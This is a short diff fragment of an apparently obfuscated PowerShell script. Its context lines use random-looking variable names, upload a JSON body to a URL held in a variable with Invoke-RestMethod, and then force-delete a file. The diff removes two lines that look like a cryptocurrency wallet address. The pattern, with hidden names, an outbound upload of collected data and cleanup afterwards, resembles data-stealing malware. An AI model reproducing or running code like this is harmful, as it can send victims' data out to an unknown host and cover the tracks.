@@ -29,5 +29,3 @@ $llgkrmcvsj32gdsg = @{
 $klfdhlkfdgrrgr += "VY8YT837HWH5IUHPHG;FGHU-9*&_(*&_(d&_*uUIHIUHIUHFDOJHGFGHFGHFH"
 $vnjemdmmfkdaf1 = Invoke-RestMethod -Uri $safftvkkkkflr923 -Method Put -Body ($ppekldlksviurk234 | ConvertTo-Json) -Headers $llgkrmcvsj32gdsg
 Remove-Item -Path $jdhgkkkduufjiegeee -Force;
-0xDE6679dD121a5181CbE6581843738571754E2946
-0xDE6679dD121a5181CbE6581843738571754E2946
